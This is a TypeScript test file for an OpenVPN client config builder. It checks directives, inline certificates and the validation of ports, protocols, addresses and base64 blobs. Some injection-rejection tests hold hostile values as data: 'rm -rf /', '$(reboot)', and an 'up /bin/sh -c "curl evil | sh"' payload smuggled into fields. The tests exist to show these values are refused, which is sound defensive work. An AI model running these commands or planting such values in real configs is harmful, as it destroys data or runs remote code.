import { test } from 'node:test'
import assert from 'node:assert/strict'
import { buildOpenVpnConfig, type OpenVpnHandshakeData } from './openvpn-config.ts'

// Real DER material in the shape the go-sdk returns (openvpn/responses.go):
// ca/cert are base64 DER X.509 certificates, key is base64 DER PKCS#8, tls is a
// base64 256-byte OpenVPN Static key V1. Generated once with openssl (prime256v1)
// so the fixture is deterministic and the crypto parses for real.
const CA_DER = 'MIIBizCCATGgAwIBAgIUJRlanpHf774AH9U8QVutSO9eKu4wCgYIKoZIzj0EAwIwGzEZMBcGA1UEAwwQS2F0YWNvbWIgVGVzdCBDQTAeFw0yNjA3MzAxMTMwNTNaFw0zNjA3MjcxMTMwNTNaMBsxGTAXBgNVBAMMEEthdGFjb21iIFRlc3QgQ0EwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAR2Sa0D5jt9GSG8Zb3ldqI/fvTVJmwscVraNY2RMTl9loQYPxZ0N6CSsqiaCvcRr7Br77JaFMnAIpLK/wpuIiAfo1MwUTAdBgNVHQ4EFgQUssT7bKec4f3/Ao/y9I/C8p/TwKEwHwYDVR0jBBgwFoAUssT7bKec4f3/Ao/y9I/C8p/TwKEwDwYDVR0TAQH/BAUwAwEB/zAKBggqhkjOPQQDAgNIADBFAiB/idtzfc84cWSYRI1VjACJ6c9AfCL9zwo9iRhLSu5NOgIhANGIwn0gtz/waasGJU6pQ+17ZoVFU4dWf3mP07jFl0pG'
const CERT_DER = 'MIIBfjCCASOgAwIBAgIUFLHnWPS7pvYXkZ2qdzUfJJNPlAwwCgYIKoZIzj0EAwIwFDESMBAGA1UEAwwJcGVlci11dWlkMB4XDTI2MDczMDExMzA1M1oXDTM2MDcyNzExMzA1M1owFDESMBAGA1UEAwwJcGVlci11dWlkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEqBCvDE/j0xutw6cfwc0R7MedAUAAs3vgiPu5Lii58VZr97uVQ2k15ijLRaX1ll8Q0ibfUEb0g63w+pWfIsxwDKNTMFEwHQYDVR0OBBYEFLnztQw97XvFeXUbDAgp5L2Je1lNMB8GA1UdIwQYMBaAFLnztQw97XvFeXUbDAgp5L2Je1lNMA8GA1UdEwEB/wQFMAMBAf8wCgYIKoZIzj0EAwIDSQAwRgIhAJugsiaDxGDPpWE4BvSkb3twsoSfQwpeam0fSBu2oeTYAiEAhqkeTzcvJB47SyR/PPScA/iFfgkSYINCQO6vTmypUCM='
const KEY_DER = 'MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg0cApCgzxt44Fs/VVWZik/FLs3GClXIyFusjlTgrambWhRANCAASoEK8MT+PTG63Dpx/BzRHsx50BQACze+CI+7kuKLnxVmv3u5VDaTXmKMtFpfWWXxDSJt9QRvSDrfD6lZ8izHAM'
const TLS_KEY = 'j7Tj79SbedWWJMHdxbBmm2/urKdRBng+sMESX5YFqb3W/rsHbrhmlj3GjCZSFyuEA44zzEzTpEkb+HuQbT6jgarrT1RVia9dLCajNT2JhmwhgKBKkMWj4yaGlHuDZY8i8uI09M9avKYFGEKBv4BHtH1SL74pc4Uy+v4wwd20DFGhVMyAO/F6jYN2JxOA7u0qZvEdIsaXOisP2hM6zODANPwrsOKXjpZFAwwOpMp+bZe536OXuDBlrTgcU+63tBmUr7APR5HhjOJJLS6uyBHZSaKzhHgZk36hVa0+T5cKVGjsDv+NuboddIDz7/wLDz0WhCe8EH3Hdbtr85Gy0DL+QA=='

const ADDRS = ['203.0.113.10']

function handshake(overrides: Partial<OpenVpnHandshakeData> = {}): OpenVpnHandshakeData {
  return {
    metadata: [{ port: 1194, protocol: 'udp', ca: CA_DER, tls: TLS_KEY }],
    cert: CERT_DER,
    key: KEY_DER,
    ...overrides,
  }
}

/** Pull an inline <tag>…</tag> block's body out of the emitted config. */
function block(config: string, tag: string): string {
  const match = config.match(new RegExp(`^<${tag}>\\n([\\s\\S]*?)\\n</${tag}>$`, 'm'))
  assert.ok(match, `expected a <${tag}> block`)
  return match[1]
}

test('buildOpenVpnConfig emits a self-contained full-tunnel client config', () => {
  const config = buildOpenVpnConfig(handshake(), ADDRS)
  const lines = config.split('\n')

  assert.ok(lines.includes('client'))
  assert.ok(lines.includes('dev sntl-ovpn')) // dedicated iface, never ovpn0/tun0
  assert.ok(lines.includes('dev-type tun'))
  assert.ok(lines.includes('proto udp'))
  assert.ok(lines.includes('remote 203.0.113.10 1194'))
  assert.ok(lines.includes('nobind'))
  assert.ok(lines.includes('auth-nocache'))
  assert.ok(lines.includes('auth SHA256'))
  assert.ok(lines.includes('data-ciphers AES-256-GCM:AES-128-GCM'))
  assert.ok(lines.includes('data-ciphers-fallback AES-256-GCM'))
  assert.ok(lines.includes('tls-cipher TLS-ECDHE-ECDSA-WITH-AES-256-GCM-SHA384'))
  assert.ok(lines.includes('tls-client'))
  assert.ok(lines.includes('tls-version-min 1.2'))
  assert.ok(lines.includes('remote-cert-tls server'))
  assert.ok(lines.includes('redirect-gateway def1 ipv6 bypass-dhcp'))
  assert.ok(lines.includes('topology subnet'))
  assert.ok(lines.includes('explicit-exit-notify 1')) // udp only
  assert.ok(lines.includes('persist-key'))
  assert.ok(lines.includes('persist-tun'))

  // Inline PKI: no file paths, so the config is the whole session.
  assert.match(block(config, 'ca'), /^-----BEGIN CERTIFICATE-----\n[\s\S]+\n-----END CERTIFICATE-----$/)
  assert.match(block(config, 'cert'), /^-----BEGIN CERTIFICATE-----\n[\s\S]+\n-----END CERTIFICATE-----$/)
  assert.match(block(config, 'key'), /^-----BEGIN PRIVATE KEY-----\n[\s\S]+\n-----END PRIVATE KEY-----$/)
  assert.match(block(config, 'tls-crypt'), /^-----BEGIN OpenVPN Static key V1-----\n[\s\S]+\n-----END OpenVPN Static key V1-----$/)
  assert.ok(!config.includes('ca.crt'), 'must not reference external PKI files')
})

test('buildOpenVpnConfig re-armors node blobs itself, so injection cannot survive', () => {
  const config = buildOpenVpnConfig(handshake(), ADDRS)

  // Bodies are OUR encoding of the decoded DER, not the node's string.
  const caBody = block(config, 'ca').split('\n').slice(1, -1).join('')
  assert.equal(caBody, CA_DER)
  for (const line of block(config, 'ca').split('\n').slice(1, -1)) {
    assert.ok(line.length <= 64, 'base64 armor is wrapped at 64 columns')
  }
  const tlsBody = block(config, 'tls-crypt').split('\n').slice(1, -1)
  assert.equal(tlsBody.length, 16) // 256 bytes as 16 lines of 32 hex chars
  assert.ok(tlsBody.every((l) => /^[0-9a-f]{32}$/.test(l)))

  // No script directive can appear anywhere in a config built from valid input.
  assert.ok(!/^\s*(up|down|route-up|script-security|plugin)\b/m.test(config))
})

test('buildOpenVpnConfig omits explicit-exit-notify for tcp', () => {
  const md = [{ port: '443', protocol: 'tcp', ca: CA_DER, tls: TLS_KEY }]
  const config = buildOpenVpnConfig(handshake({ metadata: md }), ADDRS)
  assert.ok(config.includes('proto tcp'))
  assert.ok(config.includes('remote 203.0.113.10 443')) // string port also accepted
  assert.ok(!config.includes('explicit-exit-notify'))
})

test('buildOpenVpnConfig prefers an IPv4 endpoint over IPv6 and hostnames', () => {
  const config = buildOpenVpnConfig(handshake(), ['2001:db8::1', 'node.example.com', '198.51.100.7'])
  assert.ok(config.includes('remote 198.51.100.7 1194'))
})

test('buildOpenVpnConfig falls back to the first address when none is IPv4', () => {
  const config = buildOpenVpnConfig(handshake(), ['node.example.com'])
  assert.ok(config.includes('remote node.example.com 1194'))
})

test('buildOpenVpnConfig throws on empty metadata and missing address', () => {
  assert.throws(() => buildOpenVpnConfig(handshake({ metadata: [] }), ADDRS), /no service metadata/)
  assert.throws(() => buildOpenVpnConfig(handshake(), []), /no node address/)
})

test('buildOpenVpnConfig throws on an invalid port', () => {
  for (const port of ['0', '70000', 'abc', -1]) {
    const md = [{ port, protocol: 'udp', ca: CA_DER, tls: TLS_KEY }]
    assert.throws(() => buildOpenVpnConfig(handshake({ metadata: md }), ADDRS), /invalid port/)
  }
})

test('buildOpenVpnConfig throws on an unsupported transport protocol', () => {
  for (const protocol of ['sctp', 'tcp-server', '', 'UDP']) {
    const md = [{ port: 1194, protocol, ca: CA_DER, tls: TLS_KEY }]
    assert.throws(
      () => buildOpenVpnConfig(handshake({ metadata: md }), ADDRS),
      /unsupported transport protocol/,
    )
  }
})

test('buildOpenVpnConfig rejects a malformed node address', () => {
  assert.throws(() => buildOpenVpnConfig(handshake(), ['1.2.3.4; rm -rf /']), /is malformed/)
  assert.throws(() => buildOpenVpnConfig(handshake(), ['$(reboot)']), /is malformed/)
  assert.throws(() => buildOpenVpnConfig(handshake(), ['1.2.3.4\nup /bin/sh']), /is malformed/)
})

test('buildOpenVpnConfig rejects non-canonical base64 in any blob', () => {
  // A config-directive payload smuggled into a blob field: not base64 at all.
  const evil = 'not base64\nup /bin/sh -c "curl evil | sh"'
  assert.throws(() => buildOpenVpnConfig(handshake({ cert: evil }), ADDRS), /malformed client certificate/)
  assert.throws(() => buildOpenVpnConfig(handshake({ key: evil }), ADDRS), /malformed client key/)

  const md = [{ port: 1194, protocol: 'udp', ca: evil, tls: TLS_KEY }]
  assert.throws(() => buildOpenVpnConfig(handshake({ metadata: md }), ADDRS), /malformed CA certificate/)

  // Valid base64 alphabet but non-canonical padding must also be refused.
  assert.throws(
    () => buildOpenVpnConfig(handshake({ cert: CERT_DER + '=' }), ADDRS),
    /malformed client certificate/,
  )
})

test('buildOpenVpnConfig throws on empty blobs', () => {
  assert.throws(() => buildOpenVpnConfig(handshake({ cert: '' }), ADDRS), /empty client certificate/)
  assert.throws(() => buildOpenVpnConfig(handshake({ key: '' }), ADDRS), /empty client key/)
  const md = [{ port: 1194, protocol: 'udp', ca: '', tls: TLS_KEY }]
  assert.throws(() => buildOpenVpnConfig(handshake({ metadata: md }), ADDRS), /empty CA certificate/)
})

test('buildOpenVpnConfig throws when a certificate is not real X.509', () => {
  // Well-formed base64 that decodes to bytes which are not a certificate.
  const junk = Buffer.from('this is not a certificate at all').toString('base64')
  assert.throws(() => buildOpenVpnConfig(handshake({ cert: junk }), ADDRS), /invalid client certificate/)
  const md = [{ port: 1194, protocol: 'udp', ca: junk, tls: TLS_KEY }]
  assert.throws(() => buildOpenVpnConfig(handshake({ metadata: md }), ADDRS), /invalid CA certificate/)
})

test('buildOpenVpnConfig throws when the client key is not a real private key', () => {
  const junk = Buffer.from('definitely not a private key').toString('base64')
  assert.throws(() => buildOpenVpnConfig(handshake({ key: junk }), ADDRS), /invalid client key/)
})

test('buildOpenVpnConfig requires a 256-byte tls-crypt key', () => {
  for (const bytes of [128, 255, 257, 512]) {
    const md = [{
      port: 1194,
      protocol: 'udp',
      ca: CA_DER,
      tls: Buffer.alloc(bytes, 7).toString('base64'),
    }]
    assert.throws(
      () => buildOpenVpnConfig(handshake({ metadata: md }), ADDRS),
      /tls-crypt key of the wrong length/,
    )
  }
})
